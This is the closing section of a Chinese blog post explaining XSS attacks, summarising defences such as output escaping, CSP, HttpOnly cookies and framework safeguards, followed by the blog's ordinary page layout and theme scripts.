+<p>XSS 攻击的本质，是<strong>数据和代码的边界被混淆了</strong>。用户的输入被当作了页面代码来执行，从此脚本获得了和页面同等的权限——读取 Cookie、篡改内容、发起请求，几乎无所不能。</p>
+<p>它的破坏路径是：<strong>一个漏洞 → 一段脚本 → 所有用户的浏览器 → 数据泄露或大规模传播</strong>。与 SQL 注入&quot;掏空服务器&quot;不同，XSS 掏空的是每一个访问者的浏览器和账户。</p>
+<p>防御 XSS 没有单一方案，需要 <strong>输出转义（核心）+ CSP（兜底）+ HttpOnly Cookie（加固）+ 框架安全特性（防呆）</strong> 四者结合，才能真正堵住这条&quot;幽灵&quot;进入页面的路。</p>
+<blockquote>
+<p><strong>安全的基本原则永远不变：不信任任何用户输入，不在输出时放弃对内容的控制权。</strong> 从 SQL 注入到 XSS，从 DDoS 到 ARP 欺骗，所有的攻击最终都指向同一个原点——协议和系统在最初设计时预设了&quot;善意&quot;，而攻击者恰恰利用了这份善意。信任越深的地方，破坏往往越彻底。</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.yll14.cn">桉南</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.yll14.cn/posts/260725.html">https://blog.yll14.cn/posts/260725.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank" rel="noopener noreferrer nofollow">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.yll14.cn" target="_blank">桉南的小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/">知识分享</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/260725.1.html" title="[分享]什么是MAC泛洪攻击？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260725/260725_1.webp" onerror="onerror=null;src='/img/img404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[分享]什么是MAC泛洪攻击？</div></div><div class="info-2"><div class="info-item-1">MAC泛洪是一种通过伪造海量MAC地址填满交换机CAM表的二层攻击，可导致交换机退化为广播模式，实现流量监听。本文详解其攻击原理、危害及端口安全等防御策略。</div></div></div></a><a class="pagination-related" href="/posts/260724.2.html" title="[分享]什么是SQL注入？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260724/260724_2.webp" onerror="onerror=null;src='/img/img404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[分享]什么是SQL注入？</div></div><div class="info-2"><div class="info-item-1">SQL 注入是一种通过恶意 SQL 代码操纵数据库的攻击方式，可导致数据泄露、删库甚至服务器沦陷。本文详解其原理、攻击手法与防御策略。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/260724.2.html" title="[分享]什么是SQL注入？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260724/260724_2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-24</div><div class="info-item-2">[分享]什么是SQL注入？</div></div><div class="info-2"><div class="info-item-1">SQL 注入是一种通过恶意 SQL 代码操纵数据库的攻击方式，可导致数据泄露、删库甚至服务器沦陷。本文详解其原理、攻击手法与防御策略。</div></div></div></a><a class="pagination-related" href="/posts/260723.1.html" title="[分享]什么是ARP攻击？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260723/260723_1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-23</div><div class="info-item-2">[分享]什么是ARP攻击？</div></div><div class="info-2"><div class="info-item-1">ARP 欺骗是一种局域网 ARP 协议漏洞攻击，攻击者伪造 MAC 地址实现断网或中间人窃听。本文详解攻击原理、工具与防御策略。</div></div></div></a><a class="pagination-related" href="/posts/260724.html" title="[分享]什么是UDP洪水攻击？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260724/260724_0.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-24</div><div class="info-item-2">[分享]什么是UDP洪水攻击？</div></div><div class="info-2"><div class="info-item-1">UDP 洪水攻击是一种利用 UDP 协议"无连接、不验证"特性的流量型攻击，攻击者通过肉鸡直连或反射放大向目标狂塞数据包，造成带宽拥堵与服务宕机。本文详解攻击原理、三种攻击路线与防御体系。</div></div></div></a><a class="pagination-related" href="/posts/260724.1.html" title="[分享]什么是ICMP洪水攻击？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260724/260724_1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-24</div><div class="info-item-2">[分享]什么是ICMP洪水攻击？</div></div><div class="info-2"><div class="info-item-1">ICMP Flood（Ping 洪水）是一种利用 ICMP 协议请求耗尽目标资源的 DDoS 攻击。本文详解其攻击原理、历史变种与防御策略。</div></div></div></a><a class="pagination-related" href="/posts/260725.1.html" title="[分享]什么是MAC泛洪攻击？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260725/260725_1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-25</div><div class="info-item-2">[分享]什么是MAC泛洪攻击？</div></div><div class="info-2"><div class="info-item-1">MAC泛洪是一种通过伪造海量MAC地址填满交换机CAM表的二层攻击，可导致交换机退化为广播模式，实现流量监听。本文详解其攻击原理、危害及端口安全等防御策略。</div></div></div></a><a class="pagination-related" href="/posts/260722.html" title="[分享]什么是DDOS攻击？"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260722/260722_0.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-22</div><div class="info-item-2">[分享]什么是DDOS攻击？</div></div><div class="info-2"><div class="info-item-1">本文从拒绝服务的本质出发，深入拆解DDoS攻击的核心原理、三种流量耗尽层次（带宽/协议/应用）、僵尸网络与反射放大技术、常见攻击动机，以及分层防御策略，帮你建立对DDoS攻防体系的完整认知。</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://q.qlogo.cn/headimg_dl?dst_uin=2443958507&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="avatar"/></div><div class="author-info-name">桉南</div><div class="author-info-description">如果我真的存在，也是因为你需要我</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/yll14" target="_blank" title="Github" rel="noopener noreferrer nofollow"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="mailto:ll@yll14.cn" target="_blank" title="Email" rel="noopener noreferrer nofollow"><i class="fas fa-envelope" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://qm.qq.com/q/HAXlbifl2E" target="_blank" title="QQ" rel="noopener noreferrer nofollow"><i class="fab fa-qq" style="color: #hdhfbb;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%EF%BC%9A%E7%BD%91%E9%A1%B5%E9%87%8C%E7%9A%84-%E5%B9%BD%E7%81%B5%E8%84%9A%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text">XSS：网页里的&quot;幽灵脚本&quot;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-%E5%A4%B9%E5%B8%A6%E7%A7%81%E8%B4%A7-%E8%AF%B4%E8%B5%B7%EF%BC%9AXSS-%E6%98%AF%E6%80%8E%E4%B9%88%E5%8F%91%E7%94%9F%E7%9A%84"><span class="toc-number">2.</span> <span class="toc-text">从&quot;夹带私货&quot;说起：XSS 是怎么发生的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D-XSS%EF%BC%9A%E5%AD%98%E5%82%A8%E5%9E%8B%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B%E3%80%81DOM-%E5%9E%8B"><span class="toc-number">3.</span> <span class="toc-text">三种 XSS：存储型、反射型、DOM 型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%88Stored-XSS%EF%BC%89%E2%80%94%E2%80%94%E6%9C%80%E5%8D%B1%E9%99%A9"><span class="toc-number">3.1.</span> <span class="toc-text">1. 存储型 XSS（Stored XSS）——最危险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%88Reflected-XSS%EF%BC%89%E2%80%94%E2%80%94%E6%9C%80%E6%99%AE%E9%81%8D"><span class="toc-number">3.2.</span> <span class="toc-text">2. 反射型 XSS（Reflected XSS）——最普遍</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/260819.html" title="[分享]ESA一站式网站安全服务"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260819/260819.webp" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="[分享]ESA一站式网站安全服务"/></a><div class="content"><a class="title" href="/posts/260819.html" title="[分享]ESA一站式网站安全服务">[分享]ESA一站式网站安全服务</a><time datetime="2026-08-19T03:48:00.000Z" title="发表于 2026-08-19 11:48">2026-08-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/260807.5.html" title="[分享]PHP的扩展模块"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260807/260807_5.webp" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="[分享]PHP的扩展模块"/></a><div class="content"><a class="title" href="/posts/260807.5.html" title="[分享]PHP的扩展模块">[分享]PHP的扩展模块</a><time datetime="2026-08-07T12:56:00.000Z" title="发表于 2026-08-07 20:56">2026-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/260807.4.html" title="[分享]PHP的SQLite数据库调用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260807/260807_4.webp" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="[分享]PHP的SQLite数据库调用"/></a><div class="content"><a class="title" href="/posts/260807.4.html" title="[分享]PHP的SQLite数据库调用">[分享]PHP的SQLite数据库调用</a><time datetime="2026-08-07T10:06:00.000Z" title="发表于 2026-08-07 18:06">2026-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/260807.3.html" title="[分享]PHP的PgSQL数据库调用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260807/260807_3.webp" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="[分享]PHP的PgSQL数据库调用"/></a><div class="content"><a class="title" href="/posts/260807.3.html" title="[分享]PHP的PgSQL数据库调用">[分享]PHP的PgSQL数据库调用</a><time datetime="2026-08-07T07:56:00.000Z" title="发表于 2026-08-07 15:56">2026-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/260807.2.html" title="[分享]PHP的MySQL数据库调用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../blogimage/260807/260807_2.webp" onerror="this.onerror=null;this.src='/img/img404.jpg'" alt="[分享]PHP的MySQL数据库调用"/></a><div class="content"><a class="title" href="/posts/260807.2.html" title="[分享]PHP的MySQL数据库调用">[分享]PHP的MySQL数据库调用</a><time datetime="2026-08-07T05:36:00.000Z" title="发表于 2026-08-07 13:36">2026-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 桉南</span></div><div class="footer_custom_text"><a href="https://beian.miit.gov.cn/" target="_blank" class="footer-link" rel="noopener noreferrer nofollow">赣ICP备2025061952号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.yll14.cn/npm/hexo-theme-butterfly@5.6.1/source/js/utils.min.js"></script><script src="https://cdn.yll14.cn/npm/hexo-theme-butterfly@5.6.1/source/js/main.min.js"></script><script src="https://cdn.yll14.cn/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.yll14.cn/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.yll14.cn/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.yll14.cn/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(async () => {
+  const showKatex = () => {
+    document.querySelectorAll('#article-container .katex').forEach(el => el.classList.add('katex-show'))
+  }
+
+  if (!window.katex_js_css) {
+    window.katex_js_css = true
+    await btf.getCSS('https://cdn.yll14.cn/npm/katex@0.17.0/dist/katex.min.css')
+    if (true) {
+      await btf.getScript('https://cdn.yll14.cn/npm/katex@0.17.0/dist/contrib/copy-tex.min.js')
+    }
+  }
+
+  showKatex()
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.yll14.cn',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://twikoo.yll14.cn',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.yll14.cn/npm/twikoo@1.7.14/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="https://cdn.yll14.cn/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章、标签..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.yll14.cn/npm/hexo-theme-butterfly@5.6.1/source/js/search/local-search.min.js"></script></div></div></body></html>
